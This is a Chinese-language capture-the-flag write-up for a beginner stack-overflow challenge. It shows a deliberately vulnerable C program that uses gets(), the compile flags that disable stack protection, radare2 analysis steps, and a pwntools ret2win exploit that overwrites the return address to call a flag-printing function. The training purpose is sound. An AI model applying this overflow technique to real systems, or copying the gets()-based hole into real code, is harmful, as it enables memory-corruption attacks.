## 題目
Billy want to go home now.
Do you know the address of his house ?
(Goal: 在程式裡有個未被執行的function，內有位置，想辦法呼叫它)

## 原始碼
```
// gohome.c

#include <stdio.h>
#include <stdlib.h>

void Billyshouse(){
    system("cat /home/ctf/flag");
}

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);

    char address[32];

    printf("Billy want to go home now.\n");
    printf("Do you know the address of his house ?");

    gets(address);

    return 0;
}

```

## 建立pass執行檔
```
gcc -fno-stack-protector -z execstack gohome.c -o gohome -no-pie
```
在這裡我們需要加上 -fno-stack-protector，**以關閉CANNARY這個記憶體保護機制**

若要遠端測試(remote)連到server，則需要:
```
socat TCP-LISTEN:20000,fork EXEC:'./gohome'

```

## 逆向分析
### 用 radare2 做 static analysis
```
r2 pass
aa
afl
s.main
VV
```
![image](https://user-images.githubusercontent.com/22366572/138510290-8d5e3ac9-c2b1-4ac5-a249-50e76b623007.png)


### 分析 Billyshouse:
```
s sym.Billyshouse
VV
```
![image](https://user-images.githubusercontent.com/22366572/138510580-44475b8a-86bf-4d7f-8f68-295e31b3f2f0.png)

發現此執行檔的**stack frame**長這樣:
![image](https://user-images.githubusercontent.com/22366572/138510724-85d30fca-d614-446e-92e1-bad156deb8f3.png)
根據 stack frame 我們可以撰寫exploit code

## 撰寫exploit code
我的 Billyshouse()位址是在 0x00401152 ，exploit code寫作以下:
```
from pwn import *

ip = "120.114.62.211"
port = 6126

context.arch = "amd64"

r = process('./gohome')
#r = remote(ip, port)

r.sendlineafter("?",b"a"*40+p64(0x00401152)) # fill in Billyshouse address

r.interactive()
```

這裡附一張 pwn 常用的函數表方便知道程式意義:
![image](https://user-images.githubusercontent.com/22366572/138511092-f64ca6b2-c606-47ba-992c-b37367801df8.png)

## 測試結果成功!
![image](https://user-images.githubusercontent.com/22366572/138511684-8cf17684-0818-4afd-af11-aa6dd07dee10.png)
(因為是在local host執行，所以把 Billyshouse() 改成印 ":DDDDD!!!!")
